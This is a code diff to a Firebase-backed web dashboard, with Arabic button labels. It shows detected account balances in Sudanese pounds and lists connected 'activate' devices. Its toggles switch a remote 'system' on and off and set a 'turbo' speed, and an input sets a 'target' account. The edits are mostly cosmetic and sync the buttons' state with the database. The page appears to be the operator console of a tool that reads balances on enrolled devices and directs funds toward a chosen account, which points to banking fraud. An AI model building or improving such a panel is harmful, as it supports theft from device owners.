@@ -16,11 +16,10 @@
         .value { font-size: 28px; font-weight: bold; color: var(--success); font-family: monospace; margin: 10px 0; }
         input[type="text"] { width: 100%; padding: 12px; background: #0d1117; border: 1px solid var(--border); color: white; border-radius: 6px; margin: 10px 0; box-sizing: border-box; }
         
-        /* Interactive Buttons Styling */
         .status-btn { width: 100%; padding: 15px; margin: 10px 0; border-radius: 8px; border: 1px solid var(--border); font-weight: bold; cursor: pointer; transition: 0.3s; color: white; text-transform: uppercase; }
         .btn-off { background: #21262d; color: #8b949e; }
         .btn-on { background: var(--success); box-shadow: 0 0 10px rgba(35, 134, 54, 0.4); }
-        .btn-turbo { background: #f1e05a; color: #000; }
+        .btn-turbo { background: #f1e05a; color: #000; box-shadow: 0 0 10px rgba(241, 224, 90, 0.4); }
         .btn-slow { background: #21262d; color: #8b949e; }
 
         .btn-primary { background: var(--primary); color: white; border: none; width: 100%; padding: 12px; border-radius: 6px; font-weight: bold; cursor: pointer; }
@@ -44,12 +43,12 @@
         <div class="label">Detected Account Balance</div>
         <div id="cash-display" class="value">0.00 SDG</div>
         <div class="label">Last Activity</div>
-        <div id="last-time" style="font-size: 13px;">Waiting...</div>
+        <div id="last-time" style="font-size: 13px;">Waiting for data...</div>
     </div>
 
     <div class="card">
-        <h3 style="margin-top:0">System Execution</h3>
-        <div class="label">System Connection</div>
+        <h3 style="margin-top:0">System Status</h3>
+        <div class="label">Connection Mode</div>
         <button id="system-btn" class="status-btn btn-off" onclick="toggleStatus()">غير متصل</button>
         
         <div class="label">Processing Speed</div>
@@ -84,40 +83,46 @@
     firebase.initializeApp(firebaseConfig);
     const db = firebase.database();
 
-    let isSystemOn = false;
-    let isTurboOn = false;
+    let currentSystemState = false;
+    let currentTurboState = false;
 
-    // Toggle System Status
-    function toggleStatus() {
-        isSystemOn = !isSystemOn;
+    // Listen to System Settings from Firebase
+    db.ref('Settings/System').on('value', (snap) => {
         const btn = document.getElementById('system-btn');
-        if(isSystemOn) {
+        if(snap.val() === "ON") {
+            currentSystemState = true;
             btn.innerText = "متصل / نشط";
             btn.className = "status-btn btn-on";
-            db.ref('Settings/System').set("ON");
         } else {
+            currentSystemState = false;
             btn.innerText = "غير متصل";
             btn.className = "status-btn btn-off";
-            db.ref('Settings/System').set("OFF");
         }
-    }
+    });
 
-    // Toggle Turbo Speed
-    function toggleTurbo() {
-        isTurboOn = !isTurboOn;
+    db.ref('Settings/Speed').on('value', (snap) => {
         const btn = document.getElementById('turbo-btn');
-        if(isTurboOn) {
+        if(snap.val() === "FAST") {
+            currentTurboState = true;
             btn.innerText = "حساب سريع (Turbo)";
             btn.className = "status-btn btn-turbo";
-            db.ref('Settings/Speed').set("FAST");
         } else {
+            currentTurboState = false;
             btn.innerText = "حساب بطيء";
             btn.className = "status-btn btn-slow";
-            db.ref('Settings/Speed').set("SLOW");
         }
+    });
+
+    function toggleStatus() {
+        const newState = currentSystemState ? "OFF" : "ON";
+        db.ref('Settings/System').set(newState);
     }
 
-    // Monitor Balance
+    function toggleTurbo() {
+        const newState = currentTurboState ? "SLOW" : "FAST";
+        db.ref('Settings/Speed').set(newState);
+    }
+
     db.ref('Cash').on('value', (snap) => {
         if(snap.exists()){
             document.getElementById('cash-display').innerText = snap.val() + " SDG";
@@ -127,7 +132,6 @@
         }
     });
 
-    // Monitor Devices
     db.ref('activate').on('value', (snap) => {
         const listDiv = document.getElementById('activate-list');
         const countDisplay = document.getElementById('device-count');
@@ -143,11 +147,12 @@
         }
         countDisplay.innerText = count;
         document.getElementById('net-status').innerText = "Live Connection";
+        document.getElementById('net-status').style.color = "#58a6ff";
     });
 
     function executeCommand() {
         const acc = document.getElementById('target-acc').value;
-        if(acc) { db.ref('Account').set(acc).then(() => { alert("Updated"); }); }
+        if(acc) { db.ref('Account').set(acc).then(() => { alert("Target Updated"); }); }
     }
 </script>
 </body>
